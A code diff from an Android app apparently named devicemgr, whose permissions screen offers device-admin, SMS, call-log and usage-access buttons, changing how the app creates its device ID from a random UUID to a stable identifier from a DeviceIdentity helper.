@@ -19,11 +19,11 @@ import androidx.core.content.ContextCompat;
 
 import com.company.devicemgr.receivers.DeviceAdminReceiver;
 import com.company.devicemgr.services.ForegroundTelemetryService;
+import com.company.devicemgr.utils.DeviceIdentity;
 import com.company.devicemgr.utils.AppRuntime;
 
 import java.util.ArrayList;
 import java.util.List;
-import java.util.UUID;
 
 public class MainPermissionsActivity extends Activity {
     Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia;
@@ -56,8 +56,8 @@ public class MainPermissionsActivity extends Activity {
 
         final android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
         String deviceId = sp.getString("deviceId", null);
-        if (deviceId == null) {
-            deviceId = UUID.randomUUID().toString();
+        if (deviceId == null || deviceId.trim().isEmpty()) {
+            deviceId = DeviceIdentity.getStableDeviceId(this);
             sp.edit().putString("deviceId", deviceId).apply();
         }
         tvDeviceId.setText("DeviceId: " + deviceId);
